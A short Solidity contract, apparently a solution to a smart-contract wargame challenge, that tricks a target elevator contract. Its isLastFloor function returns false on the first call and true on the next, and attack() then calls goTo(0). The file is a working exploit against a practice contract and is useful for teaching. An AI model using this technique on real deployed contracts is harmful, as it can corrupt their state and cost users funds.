// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract ElevatorAttacker {
    bool flag = true;

    function attack(address target) public {
        (bool success, ) = target.call(
            abi.encodeWithSignature("goTo(uint256)", 0)
        );
        require(success);
    }
    
    function isLastFloor(uint _floor) public returns (bool) {
        if (flag) {
            flag = false;
            return flag;
        } else {
            flag = true;
            return flag;
        }
    }
}